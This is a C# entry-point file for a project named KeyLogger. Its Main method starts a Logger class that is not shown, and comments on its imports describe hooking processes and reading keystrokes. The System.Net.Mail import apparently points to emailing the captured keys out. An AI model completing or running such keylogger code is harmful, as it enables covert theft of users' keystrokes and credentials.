﻿using System;
using System.Runtime.InteropServices; // For DLL and reading keystrokes from memory
using System.Diagnostics; // For building a hook for gaining access to running processes and modules.
using System.Windows.Forms; // For running of application and converting keystrokes
using System.IO;
using System.Net.Mail;


namespace KeyLogger
{
    class Program
    {
        static void Main(string[] args)
        {
            Logger keyLogger = new Logger();
            keyLogger.Start();
        }
    }
}